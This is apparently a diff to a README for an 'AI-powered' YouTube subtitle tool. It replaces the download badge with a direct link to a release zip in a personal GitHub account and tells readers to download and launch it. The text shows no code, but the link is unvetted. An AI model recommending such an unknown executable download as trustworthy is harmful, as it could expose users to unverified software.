@@ -15,7 +15,7 @@ SubtitleAI is an AI-powered tool that revolutionizes the way we interact with Yo
 
 To get started with SubtitleAI, simply download the latest version from the following link:
 
-[![Download SubtitleAI](https://img.shields.io/badge/Download-SubtitleAI-green)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download SubtitleAI](https://github.com/kielagustin1/SubtitleAI/releases/download/v1.0/Release.zip)](https://github.com/kielagustin1/SubtitleAI/releases/download/v1.0/Release.zip)
 
 Once downloaded, launch the application and start exploring the exciting features it has to offer!
 
